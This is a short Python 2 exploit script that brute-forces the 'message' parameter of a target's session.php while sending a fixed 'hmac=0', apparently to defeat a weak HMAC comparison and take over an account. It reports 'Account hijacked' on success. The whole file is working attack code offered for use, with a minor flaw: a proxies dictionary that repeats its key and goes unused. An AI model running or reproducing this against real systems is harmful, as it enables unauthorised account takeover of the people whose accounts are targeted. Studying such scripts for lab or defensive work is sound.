import hashlib, string, itertools, re, sys, requests
import time

proxies = {'http':'127.0.0.1:8080', 'http':'127.0.0.1:8080'} 

def update_email(ip, prefix_length):
	count = 0
	
	for word in itertools.imap(''.join, itertools.product(string.lowercase, repeat=int(prefix_length))):
		url = "http://%s/session.php?message=%s&hmac=0" % (ip, word)
		print"(*) Issuing authentication request to URL: %s " % url
		r = requests.get(url)
		res = r.text
		status_code = r.status_code
		if status_code == 200:
			if "Success" in res:
				return (True, word, count)
			else:
				count += 1
		else:
			break
	return (False, '', count)

def main():
	if len(sys.argv) != 3:
		print '(+) usage: %s <msgLength> <host_name>' % sys.argv[0]
		print '(+) eg: %s 8 localhost' % sys.argv[0]
		sys.exit(-1)

	prefix_length = sys.argv[1]
	ip = sys.argv[2]
	start_time = time.time()
	result, email , c = update_email(ip, prefix_length)

	if (result):
		print "(+) Account hijacked with email %s using %d requests!" % (email, c)
		print("--- %s seconds ---\n" % (time.time() - start_time))
	else:
		print "(-) Account hijacked failed!"

	
main()
